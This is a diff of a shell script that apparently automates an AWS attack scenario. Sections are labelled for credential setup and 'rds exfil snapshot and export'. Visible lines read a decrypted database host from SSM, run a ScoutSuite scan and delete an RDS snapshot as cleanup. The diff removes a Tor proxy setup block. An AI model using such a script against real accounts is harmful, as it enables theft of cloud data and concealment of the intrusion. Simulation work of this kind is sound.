@@ -16,18 +16,11 @@ DEPLOYMENT=${deployment}
 
 ROLE_NAME="${iam2rds_role_name}"
 SESSION_NAME="${iam2rds_session_name}"
-
+PROFILE="default"
 opts="--no-cli-pager"
 
 log "Downloading jq..."
 curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq
-
-#######################
-# tor environment setup
-#######################
-
-TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
-log "TORPROXY: $TORPROXY"
 
 #######################
 # aws cred setup
@@ -69,6 +62,7 @@ scout aws --profile=$PROFILE --report-dir /root/scout-report --no-browser
 #######################
 # rds exfil snapshot and export
 #######################
+
 # get rds details from ssm parameter store
 log "Getting db connect token..."
 DBHOST="$(aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION $opts| jq -r '.Parameter.Value' | cut -d ":" -f 1)"
@@ -190,7 +184,7 @@ log "Cleaning up snapshot..."
 aws rds delete-db-snapshot \
     --profile=$PROFILE  \
     --region=$REGION \
-    $opts   \
+    $opts  \
     --db-snapshot-identifier $DB_SNAPSHOT_IDENTIFIER >> $LOGFILE 2>&1
 
 log "Done"
